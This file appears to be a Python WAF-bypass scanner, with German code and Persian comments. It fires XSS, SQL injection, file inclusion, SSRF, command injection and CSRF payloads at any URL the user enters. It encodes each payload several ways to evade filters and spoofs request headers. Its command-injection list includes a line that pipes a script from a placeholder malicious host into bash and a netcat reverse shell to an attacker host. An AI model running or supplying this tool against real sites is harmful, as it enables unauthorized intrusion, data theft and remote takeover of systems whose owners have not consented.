import requests
import base64
import time
import random
import binascii
import json
import csv
import threading
import re
from urllib.parse import urlparse, parse_qs, urlencode
from fake_useragent import UserAgent

# ایجاد یک نشست بدون پروکسی برای اجرای فعلی
sitzung = requests.Session()
sitzung.proxies = {}  # فعلاً بدون استفاده از پروکسی
sitzung.headers.update({"User-Agent": UserAgent().random})


# تابع رمزگذاری برای عبور از WAF
def verschluessle_payloads(payload):
    return {
        "Base64": base64.b64encode(payload.encode()).decode(),
        "Hex": binascii.hexlify(payload.encode()).decode(),
        "URL": urlencode({"data": payload})[5:],
        "Rueckwaerts": payload[::-1],
        "Unicode": payload.encode("unicode_escape").decode(),
        "Doppelt_URL": urlencode({"data": urlencode({"data": payload})})[5:],
        "HTML_Entitaeten": "".join(f"&#{ord(zeichen)};" for zeichen in payload)
    }

# لیست حملات و payload ها
angriffs_payloads = {
    "XSS": ["<script>alert(1)</script>", "\"'><script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<iframe src='javascript:alert(1)'></iframe>"],
    "SQLI": ["' OR '1'='1' --", "' UNION SELECT null, username, password FROM users --", "' AND SLEEP(5)--", "admin' #"],
    "LFI": ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
    "SSRF": ["http://169.254.169.254/latest/meta-data/", "http://localhost:8000/", "http://127.0.0.1:80"],
    "RCE": ["`id`", ";curl http://malicious.com/rev.sh | bash;", "$(id)", "| nc attacker.com 4444 -e /bin/sh"],
    "CSRF": ["action=transfer&amount=1000", "action=delete&user=admin"]
}

# بررسی هدرهای امنیتی
def pruefe_sicherheitsheader(url):
    try:
        antwort = sitzung.get(url, timeout=10)
        header = antwort.headers
        fehler = []

        benoetigte_header = {
            "Content-Security-Policy": "⚠️ Content-Security-Policy ist nicht gesetzt.",
            "X-Frame-Options": "⚠️ X-Frame-Options fehlt (Clickjacking-Schutz).",
            "X-Content-Type-Options": "⚠️ X-Content-Type-Options fehlt.",
            "Strict-Transport-Security": "⚠️ HSTS ist nicht aktiviert."
        }

        for kopf, warnung in benoetigte_header.items():
            if kopf not in header:
                fehler.append(warnung)

        return fehler if fehler else ["✅ Alle Sicherheitsheader sind gesetzt."]
    except requests.exceptions.RequestException:
        return ["❌ Sicherheitsheader konnten nicht überprüft werden."]

# بررسی در دسترس بودن سایت
def pruefe_verfuegbarkeit(url):
    try:
        antwort = sitzung.get(url, timeout=10)
        return antwort.status_code == 200
    except requests.exceptions.RequestException:
        return False

# اجرای حملات
def angriff_ausfuehren(url, art, payload, codierung, ergebnisse):
    try:
        verschluesselt = verschluessle_payloads(payload)[codierung]
        url_daten = urlparse(url)
        parameter = parse_qs(url_daten.query)

        for schluessel in parameter.keys():
            temp = parameter.copy()
            temp[schluessel] = verschluesselt
            neue_query = urlencode(temp, doseq=True)
            ziel_url = f"{url_daten.scheme}://{url_daten.netloc}{url_daten.path}?{neue_query}"

            header = {
                "User-Agent": UserAgent().random,
                "Referer": "https://trusted-site.com",
                "X-Forwarded-For": "127.0.0.1",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded"
            }

            antwort = sitzung.get(ziel_url, headers=header, timeout=15)
            verdacht = any(re.search(muster, antwort.text, re.IGNORECASE) for muster in ["error", "exception", "unauthorized", "SQL", "alert(1)", "eval\\(", "system\\("])

            ergebnis = {
                "Angriff": art,
                "Codierung": codierung,
                "Payload": verschluesselt,
                "Status_Code": antwort.status_code,
                "Erfolg": payload in antwort.text,
                "Verdacht": verdacht,
                "URL": ziel_url
            }
            ergebnisse.append(ergebnis)

            if payload in antwort.text:
                print(f"⚠️ Schwachstelle erkannt: {art} ({codierung}) 🔥 {ziel_url}")
            elif antwort.status_code == 403:
                print(f"🚫 Möglicherweise durch WAF blockiert ({codierung}).")
            elif verdacht:
                print(f"⚠️ Verdächtige Antwort bei {art} ({codierung}) erkannt.")
            else:
                print(f"✅ Seite ist gegen {art} geschützt ({codierung}).")

    except requests.exceptions.RequestException as fehler:
        print(f"❌ Fehler bei {art}: {fehler}")

# اجرای تست کامل WAF
def starte_waf_test(ziel_url):
    if not ziel_url.startswith("http"):
        ziel_url = "https://" + ziel_url

    if "?" not in ziel_url:
        ziel_url += "?eingabe=test"

    print(f"🔍 Starte WAF-Test auf {ziel_url} ...")

    if not pruefe_verfuegbarkeit(ziel_url):
        print("❌ Seite ist nicht erreichbar.")
        return

    sicherheitswarnungen = pruefe_sicherheitsheader(ziel_url)
    for eintrag in sicherheitswarnungen:
        print(eintrag)

    ergebnisse = []
    threads = []

    for art, payloads in angriffs_payloads.items():
        for payload in payloads:
            for codierung in verschluessle_payloads(payload).keys():
                t = threading.Thread(target=angriff_ausfuehren, args=(ziel_url, art, payload, codierung, ergebnisse))
                threads.append(t)
                t.start()

    for t in threads:
        t.join()

    with open("waf_test_ergebnisse.csv", "w", newline="", encoding="utf-8") as f:
        felder = ["Angriff", "Codierung", "Payload", "Status_Code", "Erfolg", "Verdacht", "URL"]
        writer = csv.DictWriter(f, fieldnames=felder)
        writer.writeheader()
        writer.writerows(ergebnisse)

    print("📁 Ergebnisse gespeichert in 'waf_test_ergebnisse.csv'.")

# اجرای برنامه
if __name__ == "__main__":
    ziel = input("🔹 Gib die Ziel-URL ein (z.B. https://example.com/search?q=test): ")
    starte_waf_test(ziel)
